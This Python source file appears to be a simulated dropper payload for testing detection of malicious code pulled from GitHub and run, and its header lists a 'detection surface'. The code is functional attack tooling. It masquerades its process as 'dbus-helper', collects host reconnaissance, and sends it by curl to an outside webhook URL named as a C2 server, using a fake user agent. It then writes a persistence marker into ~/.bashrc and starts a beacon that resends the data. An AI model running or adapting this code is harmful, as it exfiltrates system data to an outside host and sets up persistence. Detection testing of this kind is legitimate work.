#!/usr/bin/env python3
# payload.py — Python dropper payload for GitHub pull-and-execute simulation.
#
# Identical behavior to payload.c (ELF variant):
#   1. Renames process to "dbus-helper" via prctl + /proc/self/comm
#   2. On-host recon — no credentials, only system facts:
#        hostname, OS, kernel, CPU model+cores, RAM, uptime,
#        network interfaces, process count, container/cloud detection
#   3. Formats recon as JSON and POSTs to C2 (curl subprocess for HTTPS)
#   4. Writes persistence marker to ~/.bashrc
#   5. Forks a background beacon child that re-sends every 60s (3 rounds)
#
# Detection surface:
#   - Python script executed from /tmp
#   - Reads /proc/cpuinfo, /proc/meminfo, /proc/net/dev, /proc/uptime,
#     /etc/os-release, /proc/version, /sys/class/dmi/id/product_name
#   - Walks /proc to count running processes
#   - Spawns curl subprocess for HTTPS POST to external host
#   - Writes to ~/.bashrc
#   - multiprocessing child left running from /tmp path

import os
import sys
import json
import time
import socket
import ctypes
import subprocess
import multiprocessing

C2_URL   = "https://webhook.site/dbd140f9-c980-48c0-96c8-e4ef8865932c"
LOG_FILE = "/tmp/.payload.log"


def plog(msg: str) -> None:
    with open(LOG_FILE, "a") as fh:
        fh.write(msg + "\n")
        fh.flush()


def slurp(path: str) -> str:
    try:
        with open(path, "r") as fh:
            return fh.read()
    except OSError:
        return ""


# ---------------------------------------------------------------------------
# Process masquerade
# ---------------------------------------------------------------------------

def set_proctitle(name: str) -> None:
    try:
        libc = ctypes.CDLL("libc.so.6", use_errno=True)
        PR_SET_NAME = 15
        libc.prctl(PR_SET_NAME, name.encode(), 0, 0, 0)
    except Exception:
        pass
    try:
        with open("/proc/self/comm", "w") as fh:
            fh.write(name[:15])
    except OSError:
        pass


# ---------------------------------------------------------------------------
# Recon collectors
# ---------------------------------------------------------------------------

def collect_os() -> tuple:
    text = slurp("/etc/os-release")
    name = ver = "unknown"
    for line in text.splitlines():
        if line.startswith("NAME="):
            name = line.split("=", 1)[1].strip('"')
        elif line.startswith("VERSION="):
            ver = line.split("=", 1)[1].strip('"')
    return name, ver


def collect_kernel() -> str:
    text = slurp("/proc/version").strip()
    return text.split("\n")[0] if text else "unknown"


def collect_cpu() -> tuple:
    text  = slurp("/proc/cpuinfo")
    model = "unknown"
    cores = 0
    for line in text.splitlines():
        if line.startswith("model name") and ":" in line:
            model = line.split(":", 1)[1].strip()
        elif line.startswith("processor"):
            cores += 1
    return model, cores


def collect_ram() -> int:
    text = slurp("/proc/meminfo")
    for line in text.splitlines():
        if line.startswith("MemTotal:"):
            try:
                return int(line.split()[1]) // 1024  # KB → MB
            except (IndexError, ValueError):
                pass
    return 0


def collect_uptime() -> int:
    text = slurp("/proc/uptime")
    try:
        return int(float(text.split()[0])) // 60  # seconds → minutes
    except (IndexError, ValueError):
        return 0


def collect_interfaces() -> str:
    text  = slurp("/proc/net/dev")
    lines = text.splitlines()
    ifaces = []
    for line in lines[2:]:
        iface = line.strip().split(":")[0].strip()
        if iface and iface != "lo":
            ifaces.append(iface)
    return ", ".join(ifaces)


def count_procs() -> int:
    try:
        return sum(1 for e in os.listdir("/proc") if e.isdigit())
    except OSError:
        return 0


def is_container() -> bool:
    if os.path.exists("/.dockerenv"):
        return True
    cgroup = slurp("/proc/1/cgroup")
    return any(x in cgroup for x in ("docker", "lxc", "kubepods"))


def detect_cloud() -> str:
    dmi = slurp("/sys/class/dmi/id/product_name").strip()
    if   "HVM"     in dmi: return "AWS"
    elif "Google"  in dmi: return "GCP"
    elif "Virtual" in dmi: return "Azure"
    elif dmi:               return dmi
    elif is_container():    return "container"
    return "unknown"


def build_recon() -> dict:
    os_name, os_ver   = collect_os()
    cpu_model, cores  = collect_cpu()
    return {
        "hostname":      socket.gethostname(),
        "uid":           os.getuid(),
        "os_name":       os_name,
        "os_version":    os_ver,
        "kernel":        collect_kernel(),
        "cpu_model":     cpu_model,
        "cpu_cores":     cores,
        "ram_mb":        collect_ram(),
        "uptime_min":    collect_uptime(),
        "interfaces":    collect_interfaces(),
        "process_count": count_procs(),
        "cloud":         detect_cloud(),
        "container":     is_container(),
        "source":        "mf2-payload-python",
    }


# ---------------------------------------------------------------------------
# Exfil via curl subprocess
# ---------------------------------------------------------------------------

def exfil(data: dict) -> None:
    body = json.dumps(data)
    plog(f"[payload] exfil: {len(body)} bytes")
    result = subprocess.run(
        [
            "curl", "-sf", "-o", "/dev/null",
            "-X", "POST", C2_URL,
            "-H", "Content-Type: application/json",
            "-H", "User-Agent: Mozilla/5.0 (Linux) Update/1.0",
            "--data", body,
        ],
        capture_output=True,
    )
    plog(f"[payload] exfil curl exit={result.returncode}")


# ---------------------------------------------------------------------------
# Persistence
# ---------------------------------------------------------------------------

def write_persistence() -> None:
    home = os.environ.get("HOME", "")
    if not home:
        return
    rc = os.path.join(home, ".bashrc")
    plog(f"[payload] writing persistence to {rc}")
    with open(rc, "a") as fh:
        fh.write("\n# system update helper\n# exec /tmp/.update-helper &>/dev/null &\n")


# ---------------------------------------------------------------------------
# Beacon child
# ---------------------------------------------------------------------------

def _beacon() -> None:
    set_proctitle("dbus-helper")
    plog(f"[beacon] started pid={os.getpid()}")
    for i in range(3):
        time.sleep(60)
        data = build_recon()
        exfil(data)
        plog(f"[beacon] round {i + 1} sent")
    plog("[beacon] done")


def start_beacon() -> None:
    child = multiprocessing.Process(target=_beacon, daemon=False)
    child.start()
    plog(f"[payload] beacon child pid={child.pid}")


# ---------------------------------------------------------------------------
# main
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    multiprocessing.set_start_method("fork")
    set_proctitle("dbus-helper")
    plog(f"[payload] started pid={os.getpid()} uid={os.getuid()}")

    recon = build_recon()
    plog(f"[payload] recon: {json.dumps(recon)}")

    exfil(recon)
    write_persistence()
    start_beacon()

    plog("[payload] parent done, beacon running")
